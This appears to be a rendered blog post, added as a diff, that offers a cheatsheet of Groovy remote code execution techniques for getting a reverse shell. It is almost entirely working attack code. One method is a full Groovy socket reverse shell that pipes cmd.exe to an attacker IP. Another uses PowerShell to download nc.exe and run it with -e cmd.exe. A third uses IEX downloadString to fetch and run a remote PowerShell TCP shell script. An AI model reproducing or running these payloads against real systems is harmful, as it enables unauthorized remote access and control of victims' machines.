@@ -1,0 +1,39 @@
+I"¶<blockquote>
+  <p>This cheatsheet describes various methods for executing remote code in Groovy Language to get an reverse shell.</p>
+</blockquote>
+
+<p><img src="/assets/Posts/groovy.jpg" alt="" /></p>
+
+<h2 id="method-1">Method 1:</h2>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">String host="10.10.14.25";</span><span class="w">
+</span><span class="gp">int port=1337;</span><span class="w">
+</span><span class="gp">String cmd="cmd.exe";</span><span class="w">
+</span><span class="gp">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();</span>Socket <span class="nv">s</span><span class="o">=</span>new Socket<span class="o">(</span>host,port<span class="o">)</span><span class="p">;</span>InputStream <span class="nv">pi</span><span class="o">=</span>p.getInputStream<span class="o">()</span>,pe<span class="o">=</span>p.getErrorStream<span class="o">()</span>, <span class="nv">si</span><span class="o">=</span>s.getInputStream<span class="o">()</span><span class="p">;</span>OutputStream <span class="nv">po</span><span class="o">=</span>p.getOutputStream<span class="o">()</span>,so<span class="o">=</span>s.getOutputStream<span class="o">()</span><span class="p">;</span><span class="k">while</span><span class="o">(!</span>s.isClosed<span class="o">()){</span><span class="k">while</span><span class="o">(</span>pi.available<span class="o">()&gt;</span>0<span class="o">)</span>so.write<span class="o">(</span>pi.read<span class="o">())</span><span class="p">;</span><span class="k">while</span><span class="o">(</span>pe.available<span class="o">()&gt;</span>0<span class="o">)</span>so.write<span class="o">(</span>pe.read<span class="o">())</span><span class="p">;</span><span class="k">while</span><span class="o">(</span>si.available<span class="o">()&gt;</span>0<span class="o">)</span>po.write<span class="o">(</span>si.read<span class="o">())</span><span class="p">;</span>so.flush<span class="o">()</span><span class="p">;</span>po.flush<span class="o">()</span><span class="p">;</span>Thread.sleep<span class="o">(</span>50<span class="o">)</span><span class="p">;</span>try <span class="o">{</span>p.exitValue<span class="o">()</span><span class="p">;</span><span class="nb">break</span><span class="p">;</span><span class="o">}</span>catch <span class="o">(</span>Exception e<span class="o">){}}</span><span class="p">;</span>p.destroy<span class="o">()</span><span class="p">;</span>s.close<span class="o">()</span><span class="p">;</span>
+</code></pre></div></div>
+<h2 id="method-2">Method 2:</h2>
+
+<h4 id="testing-code-execution">Testing code execution</h4>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">def cmd = "cmd.exe /c dir".execute();</span><span class="w">
+</span><span class="gp">println("$</span><span class="o">{</span>cmd.text<span class="o">}</span><span class="s2">");
+</span></code></pre></div></div>
+<h4 id="uploading-nc-on-victim-machine">Uploading nc on victim machine</h4>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">def process = "powershell -command Invoke-WebRequest 'http://10.10.14.11:8080/nc.exe' -OutFile nc.exe".execute();</span><span class="w">
+</span><span class="gp">println("$</span><span class="o">{</span>process.text<span class="o">}</span><span class="s2">");
+</span></code></pre></div></div>
+
+<h4 id="executing-nc-to-get-reverse-shell">Executing nc to get reverse shell</h4>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">def process = "powershell -command ./nc.exe 10.10.14.11 9001 -e cmd.exe".execute();</span><span class="w">
+</span><span class="gp">println("$</span><span class="o">{</span>process.text<span class="o">}</span><span class="s2">");
+</span></code></pre></div></div>
+
+<h2 id="method-3">Method 3:</h2>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">cmd = """ powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/Invoke-PowerShellTcp.ps1') """
+println cmd.execute().txt
+</span></code></pre></div></div>
+
+:ET
